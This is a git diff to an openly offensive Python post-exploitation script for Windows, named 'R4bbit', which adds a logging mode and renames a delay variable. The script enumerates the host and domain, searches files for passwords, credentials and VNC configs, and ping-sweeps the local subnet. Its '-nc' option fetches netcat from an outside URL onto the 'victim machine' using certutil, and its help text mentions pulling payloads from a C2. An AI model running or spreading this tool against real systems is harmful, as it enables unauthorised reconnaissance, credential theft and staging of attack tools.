@@ -12,6 +12,8 @@ import sys
 from random import random
 import msvcrt
 import subprocess
+import contextlib
+
 
 # -nc Download netcat on target
 # -srv open python webserver on victim machine
@@ -66,6 +68,7 @@ def banner():
 # ============================================== #
 
 animation = "|/-\\"
+
 
 
 
@@ -138,22 +141,24 @@ def Get_payload():
 # ============================================== #
 
 
-def Enum_system():
+def Enum_system(DELAY):
 
 	try :
-		THREADS = input(style.GREEN + '[-)' + style.WHITE + ' Choose number of threads (1.5s by default) : ')
-		#print(THREADS)
-
-		if THREADS == '':
-			THREADS = '1.5'
-			print(style.YELLOW + '\n\n[*]' + style.WHITE + f' Threads set to default ({THREADS} seconds)')
+		if DELAY == -1:
+			DELAY = input(style.GREEN + '[-)' + style.WHITE + ' Choose number of DELAY (1.5s by default) : ')
+			pass
+		#DELAY = input(style.GREEN + '[-)' + style.WHITE + ' Choose number of DELAY (1.5s by default) : ')
+		#print(DELAY)
+		if DELAY == '':
+			DELAY = '1.5'
+			print(style.YELLOW + '\n\n[*]' + style.WHITE + f' DELAY set to default ({DELAY} seconds)')
 			time.sleep(1)
 			print(style.RED +'[!]' + style.WHITE + ' R4bbit is hungry and try to get new friends ...')
-			THREADS = 1.5
+			DELAY = 1.5
 		else : 
-			print(style.GREEN + '[+]' + style.WHITE + f' R4bbit setting threads set to {THREADS} seconds.')
+			print(style.GREEN + '[+]' + style.WHITE + f' R4bbit setting DELAY set to {DELAY} seconds.')
 			time.sleep(1)
-			THREADS = int(float(THREADS))
+			DELAY = int(float(DELAY))
 
 		LOCAL_USERNAME = os.getlogin()
 
@@ -162,24 +167,24 @@ def Enum_system():
 		print(style.YELLOW + '[+]'  + style.WHITE +' R4bbit try to find some infos reliated to this windo system ...\n')
 		time.sleep(1)
 		subprocess.call('systeminfo' , stdout=sys.stdout, shell=True)
-		time.sleep(THREADS)
+		time.sleep(DELAY)
 		print(style.UNDERLINE +'\n--------------------------------------------------------------------------' + style.RESET)
 		print(style.GREEN + '\n[+]' +style.WHITE +' R4bbit try to watch if are there TCP open ports ...\n')
 		time.sleep(0.5)
 		subprocess.call('netstat -ano|findstr /i tcp|findstr /i LISTENING', stdout=sys.stdout, shell=True)
-		time.sleep(THREADS)
+		time.sleep(DELAY)
 		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
 		print(style.GREEN + '\n[+]' + style.WHITE + ' R4bbit check if this account have any interesting privilege ...\n')
 		time.sleep(0.5)
 		subprocess.call(f'net user /domain {LOCAL_USERNAME}', stdout=sys.stdout, shell=True)
-		time.sleep(THREADS)
+		time.sleep(DELAY)
 		
 		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
 		print(style.GREEN + '\n[+]' + style.WHITE + ' R4bbit check more infos about the Domain Controller ...\n')
 		time.sleep(1)
 		subprocess.Popen('powershell.exe [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()', stdout=sys.stdout)
 		#print(p)
-		time.sleep(THREADS)
+		time.sleep(DELAY)
 		time.sleep(1)
 
 		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
@@ -195,13 +200,18 @@ def Enum_system():
 		#os.system('findstr /spin "password" *.*')
 		print(style.GREEN + '\n[+]' + style.WHITE + ' ultravnc files ...\n')
 		os.system('dir c:*ultravnc.ini /s /b')
-		print(style.GREEN + '\n[+]' + style.WHITE + ' vnc files ...\n')
-		os.system('dir c:\\ /s /b | findstr /si *vnc.ini')
+		yesno = input(style.YELLOW +'\n[?]'+ style.RESET +' Do you want to search for vnc files (This may take a long time) type "yes" or enter to continue :')
+		if yesno == 'yes':
+			print(style.GREEN + '\n[+]' + style.WHITE + ' vnc files ...\n')
+			os.system('dir c:\\ /s /b | findstr /si *vnc.ini')
+			pass
+		else:
+			pass
 		#print(style.GREEN + '\n[+]' + style.WHITE + ' default installation files ...\n')
 		#os.system('type C:\\unattend.xml, C:\\sysprep.inf, C:\\sysprep\\sysprep.xml')
 		#subprocess.Popen('', stdout=sys.stdout)
 		#print(p)
-		time.sleep(THREADS)
+		time.sleep(DELAY)
 		time.sleep(1)
 
 		print(style.UNDERLINE +'\n--------------------------------------------------------------------------' + style.RESET)
@@ -209,22 +219,22 @@ def Enum_system():
 		time.sleep(0.5)
 		subprocess.call('wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\\Windows"', stdout=sys.stdout, shell=True)
 		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
-		time.sleep(THREADS)
+		time.sleep(DELAY)
 		print(style.GREEN + '\n[+]' + style.WHITE + ' R4bbit is checking installed applications ...\n')
 		time.sleep(0.5)
 		subprocess.call('wmic product get name,version,vendor', stdout=sys.stdout, shell=True)
 		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
-		time.sleep(THREADS)
+		time.sleep(DELAY)
 		print(style.GREEN + '\n[+]' + style.WHITE + ' R4bbit is checking network interface configuration ...\n')
 		time.sleep(0.5)
 		subprocess.call('ipconfig /all', stdout=sys.stdout, shell=True)
 		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
-		time.sleep(THREADS)
+		time.sleep(DELAY)
 		print(style.GREEN + '\n[+]' + style.WHITE + f' R4bbit is checking {LOCAL_USERNAME} permissions and groups ...\n')
 		time.sleep(0.5)
 		subprocess.call('whoami /priv /groups', stdout=sys.stdout, shell=True)
 		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
-		time.sleep(THREADS)
+		time.sleep(DELAY)
 		print(style.GREEN + '\n[+]' + style.WHITE + ' R4bbit is checking local network status ...')
 		time.sleep(1)
 		print(style.GREEN +'[+]' + style.WHITE +' R4bbit is getting ip addresses ...')
@@ -239,7 +249,7 @@ def Enum_system():
 
 		i = 0
 		staussum = 0
-		time.sleep(THREADS)
+		time.sleep(DELAY)
 		subprocess.call(f'arp -a|findstr /i {local_ip}', stdout=sys.stdout, shell=True)
 		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
 
@@ -253,7 +263,7 @@ def Enum_system():
 			sys.stdout.write(style.CYAN + "\r" + animation[i % len(animation)])
 			sys.stdout.flush()
 			status = os.system(f'ping -n 1 -w 200 {local_ip}.' + f'{i} > nul && echo  ʕɔ•_•ʔɔ [$] New friend found : {local_ip}.' + f'{i}')
-			time.sleep(THREADS)
+			time.sleep(DELAY)
 
 		print(style.RED +'\n[!]' + style.WHITE +' R4bbit is now trying to find HIDDED friends (^ₒ^c) ...')
 		time.sleep(2)
@@ -266,14 +276,99 @@ def Enum_system():
 		time.sleep(0.3)
 		print(style.GREEN + '[+]' + style.WHITE + ' R4bbit finished to fetch this system.')
 
+
 	except KeyboardInterrupt:
     		print(style.RED + '''\n🛑 ''' + style.WHITE + "R4bbit is hidding ...")
+
+def Enum_system_file(DELAY):
+
+	try :
+		if DELAY == -1:
+			DELAY = input(style.GREEN + '[-)' + style.WHITE + ' Choose number of DELAY (1.5s by default) : ')
+			pass
+		if DELAY == '':
+			DELAY = '1.5'
+			print(style.YELLOW + '\n\n[*]' + style.WHITE + f' DELAY set to default ({DELAY} seconds)')
+			print(style.RED +'[!]' + style.WHITE + ' R4bbit is hungry and try to get new friends ...')
+			DELAY = 1.5
+		else : 
+			print(style.GREEN + '[+]' + style.WHITE + f' R4bbit setting DELAY set to {DELAY} seconds.')
+			DELAY = int(float(DELAY))
+
+		LOCAL_USERNAME = os.getlogin()
+
+		print(style.BLUE + '[*]' + style.WHITE + f' R4bbit found local user is : {LOCAL_USERNAME}')
+		print(style.YELLOW + '[+]'  + style.WHITE +' R4bbit try to find some infos reliated to this windo system ...\n')
+		subprocess.call('systeminfo' , stdout=sys.stdout, shell=True)
+		time.sleep(DELAY)
+		subprocess.call('netstat -ano|findstr /i tcp|findstr /i LISTENING', stdout=sys.stdout, shell=True)
+		time.sleep(DELAY)
+		subprocess.call(f'net user /domain {LOCAL_USERNAME}', stdout=sys.stdout, shell=True)
+		time.sleep(DELAY)
+		subprocess.Popen('powershell.exe [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()', stdout=sys.stdout)
+		#print(p)
+		time.sleep(DELAY)
+		os.system('dir /a /s *pass* == *cred* == *vnc* == *.config* == *proof.txt* == *local.txt*')
+		print(style.GREEN + '\n[+]' + style.WHITE + ' Text files ...\n')
+		os.system('findstr /si password *.txt')
+		print(style.GREEN + '\n[+]' + style.WHITE + ' XML files ...\n')
+		os.system('findstr /si password *.xml')
+		print(style.GREEN + '\n[+]' + style.WHITE + ' ini files ...\n')
+		os.system('findstr /si password *.ini') 
+		#os.system('findstr /spin "password" *.*')
+		print(style.GREEN + '\n[+]' + style.WHITE + ' ultravnc files ...\n')
+		os.system('dir c:*ultravnc.ini /s /b')
+		#print(style.GREEN + '\n[+]' + style.WHITE + ' vnc files ...\n')
+		#os.system('dir c:\\ /s /b | findstr /si *vnc.ini')
+		#print(style.GREEN + '\n[+]' + style.WHITE + ' default installation files ...\n')
+		#os.system('type C:\\unattend.xml, C:\\sysprep.inf, C:\\sysprep\\sysprep.xml')
+		#subprocess.Popen('', stdout=sys.stdout)
+		time.sleep(DELAY)
+		subprocess.call('wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\\Windows"', stdout=sys.stdout, shell=True)
+		time.sleep(DELAY)
+		subprocess.call('wmic product get name,version,vendor', stdout=sys.stdout, shell=True)
+		time.sleep(DELAY)
+		subprocess.call('ipconfig /all', stdout=sys.stdout, shell=True)
+		time.sleep(DELAY)
+		subprocess.call('whoami /priv /groups', stdout=sys.stdout, shell=True)
+		time.sleep(DELAY)
+		hostname = socket.gethostname()
+		local_ip = socket.gethostbyname(hostname)
+		time.sleep(0.5)
+		local_ip = '.'.join(local_ip.split('.')[:-1]) # Replace last byte from ip adress
+		time.sleep(1)
+
+		i = 0
+		staussum = 0
+		time.sleep(DELAY)
+		subprocess.call(f'arp -a|findstr /i {local_ip}', stdout=sys.stdout, shell=True)
+		print(style.UNDERLINE +'\n--------------------------------------------------------------------------'+ style.RESET)
+
+		print(style.GREEN +'\n[+]'+ style.WHITE + ' R4bbit try to ping his friends ... ')
+		print(style.CYAN +'[?]' + style.WHITE + ' R4bbit is slow be patient ... <(O__O)> \n')
+
+		#print(style.RED +'\n[!]' + style.WHITE +' R4bbit is now trying to find HIDDED friends (^ₒ^c) ...')
+		#os.system(f'arp -a >> hidden_friends_hosts.txt')
+		
+		for i in range(0,256,1):
+
+			sys.stdout.write(style.CYAN + "\r" + animation[i % len(animation)])
+			sys.stdout.flush()
+			# ping -n 1 -w 200 {local_ip}.' + f'{i} > nul && {local_ip}.' + f'{i}' + ' > output.txt
+			print(f'[DEBUG] ping -n 1 -w 200 {local_ip}.' + f'{i} > nul && echo {local_ip}.' + f'{i}' + ' > friends_hosts.txt')
+			os.system(f'ping -n 1 -w 200 {local_ip}.' + f'{i} > nul && echo {local_ip}.' + f'{i}' + ' >> friends_hosts.txt')
+			time.sleep(DELAY)
+
+	except KeyboardInterrupt:
+    		print(style.RED + '''\n🛑 ''' + style.WHITE + "R4bbit is hidding ...")
+
 
 # ============================================== #
 # MAIN 
 # ============================================== #
 
 def main():
+	DELAY = -1
 	banner()
 	#New_prompt()
 
@@ -286,10 +381,24 @@ def main():
 	if result == False:
 
 		print(style.YELLOW + '[?]' + style.WHITE + ' No argument specified set to : default enumeration')
-		Enum_system()
-
+		Enum_system(DELAY)
 	else:
+		if result == "-o":
 
+			DELAY = input(style.GREEN + '[-)' + style.WHITE + ' Choose number of DELAY (1.5s by default) : ')
+			print(style.GREEN + '[+]' + style.WHITE + ' All outputs redirected to --> nervous_log.txt')
+			print(style.GREEN + '[+]' + style.WHITE + ' All active hosts IP redirected to --> friends_hosts.txt')
+			print(style.GREEN + '[+]' + style.WHITE + ' Rabbit is now fetching the system ... ')
+			print(style.MAGENTA + "\n[DEBUG]" + style.RESET + " Shell outputs :")
+			with open("nervous_log.txt", "w") as f:
+				with contextlib.redirect_stdout(f):
+					Enum_system_file(DELAY)
+			
+			print(style.GREEN + '\n\n[+]' + style.WHITE + ' R4bbit finished to fetch this system.')
+			print(style.GREEN + '[+]' + style.WHITE + ' Output main : nervous_log.txt')
+			print(style.GREEN + '[+]' + style.WHITE + ' Output active hosts : friends_hosts.txt')
+			exit()
+			
 		if result == "-nc":
 
 			print(style.RED + '[*]' + style.WHITE + ' Are you sure to import netcat executable on this machine ? (y/N)')
@@ -308,16 +417,14 @@ def main():
 				#https://github.com/diegocr/netcat/blob/master/nc.exe
 				time.sleep(2)
 				subprocess.Popen('powershell.exe certutil.exe -urlcache -f https://github.com/diegocr/netcat/blob/master/nc.exe', stdout=sys.stdout)
-				
-		
-			elif(validate == ord('N')):
-				Enum_system()
-			
-			#MANAGE if user dont put any of these y or n
 
+
+			elif(validate == ord('N')):
+				Enum_system(DELAY)
 		
+
 			elif(validate == ord('n')):
-				Enum_system()
+				Enum_system(DELAY)
 
 			else:
 				print(style.RED + '[!]' + style.WHITE + "Don't try to play with rabbit next time just tell YES or NO ?")
@@ -336,14 +443,15 @@ def main():
   OPTIONS :
      		 
      -> No options will enumerate exploitable windows processes
-         
+     
+     -o   make full enumeration & create output file
      -nc  download netcat for the victim from internet [Unavailable yet]
      -srv open python webserver on victim machine
      -get download payload from your C2
 
 				''')
 		else:
-			print(style.RED + '[!]' + style.WHITE + "Wrong argument specified.")
+			print(style.RED + '[!]' + style.WHITE + " Wrong argument specified.")
 
 	
 if __name__ == '__main__':
